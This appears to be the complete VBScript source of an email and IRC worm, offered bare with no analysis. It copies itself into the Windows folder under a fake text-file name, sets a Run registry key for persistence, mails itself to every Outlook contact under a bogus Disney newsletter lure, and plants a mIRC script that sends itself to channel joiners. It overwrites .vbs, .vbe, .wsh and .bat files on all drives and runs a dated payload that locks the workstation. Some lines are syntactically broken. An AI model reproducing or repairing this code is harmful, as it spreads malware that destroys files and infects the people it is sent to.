set Variable0 = createobject("scripting.filesystemobject")
Variable1 = Variable0.getspecialfolder(0)
Variable2 = Variable1 & "\Alice-at-WonderLand.txt.vbe"
set Variable3 = createobject("wscript.shell")
Variable3.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\run", Variable1 & "\"&"Alice-at-WonderLand.txt.vbe"
Variable0.copyfile wscript.scriptfullname, Variable2
Variable6
Function Variable6()
Set Variable13 = CreateObject("Outlook.Application")
If Variable13 = "Outlook" Then
Set Variable14 = Variable13.GetNameSpace("MAPI")
Set Variable15 = Variable14.AddressLists
For Each Variable16 In Variable15
If Variable16.AddressEntries.Count <> 0 Then
Variable17 = Variable16.AddressEntries.Count
For Variable18 = 1 To Variable17
Set Variable19 = Variable13.CreateItem(0)
Set Variable20 = Variable16.AddressEntries(Variable18)
Variable19.To = Variable20.Address
Variable19.Subject = "Walt Disneys News"
Variable19.Body = "Hello,  This is the Walt Disneys News Letter, Please view this file, it is very important.Thanks!"
execute "set Variable21 = Variable19." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
Variable22 = Variable2
Variable19.DeleteAfterSubmit = True
Variable21.Add Variable22
If Variable19.To <> "" Then
Variable19.Send
End If
Next
End If
Next
End If
End function
Function Variable8(Variable23)
If Variable23 <> "" Then
Variable24 = Variable3.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Variable0.fileexists("c:\mirc\mirc.ini") Then
Variable23 = "c:\mirc"
ElseIf Variable0.fileexists("c:\mirc32\mirc.ini") Then
Variable23 = "c:\mirc32"
ElseIf Variable0.fileexists(Variable24 & "\mirc\mirc.ini") Then
Variable23 = Variable24 & "\mirc"
ElseIf Variable0.fileexists(Variable24 & "\mirc32\mirc.ini") Then
Variable23 = Variable24 & "\mirc"
Else
Variable23 = ""
End If
End If
If Variable23<>""Then
Set Variable25 = Variable0.CreateTextFile(Variable23 & "\script.ini", True)
Variable25 = "[script]" &  vbCrLf & "n0=on 1:JOIN:#:{"
Variable25 = Variable25 & vbCrLf & "n0=on 1:JOIN:#:{"
Variable25 = Variable25 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
Variable25 = Variable25 & vbCrLf & "n2=  /."& Chr(100) & Chr(99) & Chr(99) & " send $nick "
Variable25 = Variable25 & Variable2
Variable25 = Variable25 & vbCrLf & "n3=}"
script.Close
End If
Variable40
Function Variable40()
On Error Resume Next
Set A5O14007 = Variable0.Drives
For Each Variable46 In A5O14007
If Variable46.Drivetype = Remote Then
Variable44 = Variable46 & "\"
Call Variable45(Variable44)
Elseif Variable46.isready then
Variable44 = Variable46 & "\"
Call Variable45(Variable44)
End If
Next
End function
Function Variable45(OT2016KI)
Set GJF6856R = Variable0.GetFolder(OT2016KI)
Set E9DOP13B = GJF6856R.Files
For Each Variable37 In E9DOP13B
if lcase(Variable35 = "mirc.ini" then
Variable8(Variable35.parentfolder)
end if
If Variable0.GetExtensionName(Variable37.path) ="vbs" then
Variable0.CopyFile wscript.scriptfullname ,Variable37.path , true
End if
If Variable0.GetExtensionName(Variable37.path) ="vbe" then
Variable0.CopyFile wscript.scriptfullname , Variable37.path , true
End if
If Variable0.GetExtensionName(Variable37.path) ="wsh" then
Variable0.CopyFile wscript.scriptfullname ,Variable37.path , true
End if
If Variable0.GetExtensionName(Variable37.path) ="bat" then
Variable0.CopyFile wscript.scriptfullname ,Variable37.path , true
End if
Next
Set Variable37 = Variable33.Subfolders
For Each Variable36 In Variable37
Call Variable45(Variable37.path)
Next
End function
Sub StartProcess (CommandLine, CurrentDirectory, computername)
Dim Proc, ProcessId
Set Proc = GetObject("WinMgmts://"& computername &"/root/cimv2").Get("Win32_Process")
Proc.Create CommandLine, CurrentDirectory, ProcessId
Set Proc = Nothing
End Sub
Variable4
Function Variable4()
If month(now) = 1 and day(now) = 26 then
Variable3.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","GhostDog"
Set Variable50 = Variable0.opentextfile("c:\Alice-at-WonderLand.txt", 2, True, 0)
Variable50.writeline"Walt Disney´s News Letter"
Variable50.Close
Set Variable50 = nothing
Dim comp
comp = WScript.CreateObject("WScript.Network").ComputerName
StartProcess "Rundll32.exe user32.dll,LockWorkStation", "C:\", comp
Dim sh, desktop, url
Set sh = WScript.CreateObject("WScript.Shell")
desktop = sh.SpecialFolders("Desktop")
Set url = sh.CreateShortcut(desktop & "\ClickMe.url")
url.TargetPath = "http://www.avp.ch"
url.Save
Set url = Nothing
Set sh = Nothing
end if
end function
set Variable9 = Variable0.opentextfile(wscript.scriptfullname)
Variable10 = Variable9.readall
Variable9.Close
Do
If Not (Variable0.fileexists(wscript.scriptfullname)) Then
Set Variable11 = Variable0.createtextfile(wscript.scriptfullname, True)
Variable11.write Variable10
Variable11.Close
End If
Loop
Do
Variable12 = Variable3.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\run")
if Variable12 <> "wscript.exe AliceAlice-at-WonderLand.txt.vbe %"then
Variable3.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\run", "wscript.exe AliceAlice-at-WonderLand.txt.vbe %"
end if
Variable12=""
Loop
